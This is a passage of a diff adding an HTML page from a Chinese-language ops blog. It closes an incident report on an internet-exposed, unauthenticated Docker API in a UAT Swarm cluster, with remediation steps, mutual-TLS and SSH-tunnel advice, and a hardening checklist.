+<p>所以“只绑内网 IP”不等于“只有内网能访问”，还必须：</p>
+<ul>
+<li>在主机/云防火墙按来源 IP 限制；</li>
+<li>或者根本不在公网开放；</li>
+<li>或者改成 SSH 隧道 / 双向 TLS。</li>
+</ul>
+<h3 id="5-Mark-问的-认证-是什么">5. Mark 问的“认证”是什么</h3>
+<p>不是简单的用户名密码。Docker API 的正式认证方式是<strong>双向 TLS</strong>：</p>
+<ul>
+<li>服务端有证书；</li>
+<li>客户端也要有证书；</li>
+<li>双方互相验证，证书不对就连接不上。</li>
+</ul>
+<p>最省事的方式是 SSH 隧道：公网只开 SSH，Docker 只监听本机，运维通过堡垒机进去管理。</p>
+<h3 id="6-这次已经做了什么">6. 这次已经做了什么</h3>
+<ul>
+<li>2375/2376 只允许内网来源，公网已阻断；</li>
+<li><code>portainer-agent</code> 已移除，不再让它读写宿主根目录和 Docker Socket；</li>
+<li>恶意 cron、进程、隐藏可执行文件和 C2 地址已清理；</li>
+<li>四台 UAT 已启用端口白名单和开机恢复；</li>
+<li><code>daemon.json</code> 已改为仅 Unix Socket，等维护窗口重启 Docker 后 2375 会彻底消失。</li>
+</ul>
+<h3 id="7-还必须记住的三句话">7. 还必须记住的三句话</h3>
+<ol>
+<li><strong>Docker 2375 永远不要对公网开放。</strong></li>
+<li><strong>换端口不是安全措施，认证和来源限制才是。</strong></li>
+<li><strong>Portainer/cadvisor 这类监控容器不要读写挂载宿主 <code>/</code> 和 <code>docker.sock</code>。</strong></li>
+</ol>
+<h2 id="防复发清单">防复发清单</h2>
+<h3 id="必须立即完成">必须立即完成</h3>
+<ul>
+<li>禁止 Docker <code>2375</code> 暴露公网；远程管理只走 SSH 隧道或双向 TLS 2376</li>
+<li>限制公网 SSH，只允许固定运维出口 IP；禁止 root 密码登录</li>
+<li>轮换 manager 上的 SSH Key、GitLab Token、机器人 Token、监控账号、数据库/中间件凭据</li>
+<li>轮换 Docker TLS CA/服务端/客户端证书，以及所有曾存放在 manager 的密钥</li>
+<li>对 manager 做完整取证后重装系统，或在可信快照上重建；不要只依赖本次进程清理</li>
+</ul>
+<h3 id="长期基线">长期基线</h3>
+<ul>
+<li>监控组件与 Swarm manager 分离部署，禁止在 manager 上跑高占用监控栈</li>
+<li>Portainer agent 不得挂载宿主根目录和 Docker Socket；非必要不部署</li>
+<li>Docker 节点只开放业务必需端口，默认拒绝其他入站</li>
+<li>每周执行 <code>security/audit_docker_exposure.sh</code></li>
+<li>每日检查 <code>/etc/crontab</code>、<code>/etc/cron.d</code>、用户 crontab、systemd、异常可执行文件、OOM 和容器 restart loop</li>
+<li>禁止重新部署 <code>portainer-agent</code>；监控统一使用 Beszel，cadvisor/node-exporter 仅保留只读挂载</li>
+<li>对容器 CPU、内存、重启、僵尸进程增加告警</li>
+<li>业务服务部署配置必须固化 1.5GiB 上限，不能只保留运行时 override</li>
+<li>负载测试只允许在隔离节点执行，执行前在群内登记时间、范围和结束条件</li>
+</ul>
+<h2 id="相关文件">相关文件</h2>
+<ul>
+<li>内存调整脚本：<code>code/ops-scripts-运维部署脚本/swarm/apply_business_memory_limits.sh</code></li>
+<li>Swarm 维护说明：<code>code/ops-scripts-运维部署脚本/swarm/README.md</code></li>
+<li>安全审计脚本：<code>code/ops-scripts-运维部署脚本/security/audit_docker_exposure.sh</code></li>
+<li>防火墙白名单脚本：<code>code/ops-scripts-运维部署脚本/security/apply_uat_firewall.sh</code></li>
+<li>本地原始证据：<code>/Users/ben/Downloads/授权安全测试处置_20261027_1852/</code>（不入库）</li>
+</ul>
+<h2 id="提交">提交</h2>
+<ul>
+<li>本轮巡检、二次处置、防火墙脚本和 Workbench 文件统一本地提交，具体 commit 见仓库 HEAD。</li>
+</ul>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#事件摘要">事件摘要</a></li><li style="margin-left:0.0rem"><a href="#时间线">时间线</a></li><li style="margin-left:0.0rem"><a href="#根本原因">根本原因</a></li><li style="margin-left:0.8rem"><a href="#1-直接原因-异常伪装进程耗尽-CPU-和内存">1. 直接原因：异常伪装进程耗尽 CPU 和内存</a></li><li style="margin-left:0.8rem"><a href="#2-安全入口-Docker-API-无认证暴露公网">2. 安全入口：Docker API 无认证暴露公网</a></li><li style="margin-left:0.8rem"><a href="#3-持久化-恶意-cron">3. 持久化：恶意 cron</a></li><li style="margin-left:0.8rem"><a href="#4-放大因素-单节点资源过度集中">4. 放大因素：单节点资源过度集中</a></li><li style="margin-left:0.0rem"><a href="#处理过程">处理过程</a></li><li style="margin-left:0.8rem"><a href="#1-监控与异常分析">1. 监控与异常分析</a></li><li style="margin-left:0.8rem"><a href="#2-业务恢复">2. 业务恢复</a></li><li style="margin-left:0.8rem"><a href="#3-按最新要求精简监控">3. 按最新要求精简监控</a></li><li style="margin-left:0.8rem"><a href="#4-安全隔离">4. 安全隔离</a></li><li style="margin-left:0.0rem"><a href="#最终验证">最终验证</a></li><li style="margin-left:0.0rem"><a href="#当前风险">当前风险</a></li><li style="margin-left:0.0rem"><a href="#18-37-复发与二次处置-v2">18:37 复发与二次处置（v2）</a></li><li style="margin-left:0.8rem"><a href="#复发确认">复发确认</a></li><li style="margin-left:0.8rem"><a href="#二次处置">二次处置</a></li><li style="margin-left:0.8rem"><a href="#二次验证">二次验证</a></li><li style="margin-left:0.8rem"><a href="#防火墙结论">防火墙结论</a></li><li style="margin-left:0.0rem"><a href="#19-20-业务域名-Portainer-与验证码恢复-v3">19:20 业务域名、Portainer 与验证码恢复（v3）</a></li><li style="margin-left:0.8rem"><a href="#现象">现象</a></li><li style="margin-left:0.8rem"><a href="#根因与修复">根因与修复</a></li><li style="margin-left:0.8rem"><a href="#验证">验证</a></li><li style="margin-left:0.0rem"><a href="#附录-大白话讲清授权安全测试底层原因">附录：大白话讲清授权安全测试底层原因</a></li><li style="margin-left:0.8rem"><a href="#一句话总结">一句话总结</a></li><li style="margin-left:0.8rem"><a href="#1-Docker-API-是什么">1. Docker API 是什么</a></li><li style="margin-left:0.8rem"><a href="#2-授权安全测试是怎么一步步放大的">2. 授权安全测试是怎么一步步放大的</a></li><li style="margin-left:0.8rem"><a href="#3-为什么-换个端口-没用">3. 为什么“换个端口”没用</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：基础设施与自动化 / BKL UAT</li>
+          <li>日期：2026-10-27</li>
+          <li>标签：<span class="tag">BKL UAT</span><span class="tag">Linux</span><span class="tag">Shell</span><span class="tag">Python</span><span class="tag">Docker</span><span class="tag">Nginx</span><span class="tag">监控告警</span><span class="tag">CDN</span></li>
+          <li><span>来源：~/Projects/work/ops/devops/devops-bkl/doc/2026年10月27日-Beszel巡检与安全事件处置/2026年10月27日-Beszel巡…</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202610270000-%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E4%B8%8E%E8%87%AA%E5%8A%A8%E5%8C%96%2BBKL%20UAT%2BLinux-Beszel%20%E6%97%A5%E5%B7%A1%E6%A3%80%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE%EF%BC%882026-10-27%EF%BC%89.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>Beszel 日巡检与安全事件处置（2026-10-27）。本文属于基础设施与自动化 / BKL UAT，日期：2026-10-27 执行人：Ben（运维） 版本：v4（复发处置 + 访问恢复 + 根因大白话） 14:04 起 manager 出现持续 Docker cgroup OOM，14:17 开始监控集中…</p>
+      <p>关键词：BKL UAT、Linux、Shell、Python、Docker、Nginx、监控告警、CDN、基础设施与自动化、基础设施与自动化 / BKL UAT、Beszel 日巡检与安全事件处置（2026-10-27）、devops</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b27501c44497.html"><small>上一篇</small>Beszel 日巡检与安全事件处置（2026-10-27）</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-cd3357f50ea7.html"><small>下一篇</small>游点涩项目运维快速上手</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b4edded0a655.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
